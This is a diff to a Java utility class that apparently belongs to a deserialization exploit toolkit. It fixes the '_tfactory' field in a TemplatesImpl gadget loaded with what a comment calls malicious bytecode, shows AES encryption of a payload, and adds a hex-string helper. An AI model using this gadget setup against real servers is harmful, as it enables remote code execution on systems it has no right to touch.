@@ -50,7 +50,7 @@ public class Utils {
         setValue(templates,"_name","aaa");
         // 这里的恶意字节码 必须要使用存在的类 ，不能使用 makeClass 生成的；
         setValue(templates,"_bytecodes",new byte[][]{bytes});
-        setValue(templates,"",new TransformerFactoryImpl());
+        setValue(templates,"_tfactory",new TransformerFactoryImpl());
 
         return templates;
     }
@@ -100,5 +100,15 @@ public class Utils {
         byte[] keyBytes = Base64.getDecoder().decode(key);
 
         return aes.encrypt(Base64.getDecoder().decode(payload) , keyBytes).toString();
+    }
+
+    public static String byteArray2HexString(byte[] ba) {
+        StringBuilder resultSb = new StringBuilder();
+
+        for (byte b: ba){
+            resultSb.append(String.format("%02x", b));
+        }
+
+        return resultSb.toString();
     }
 }
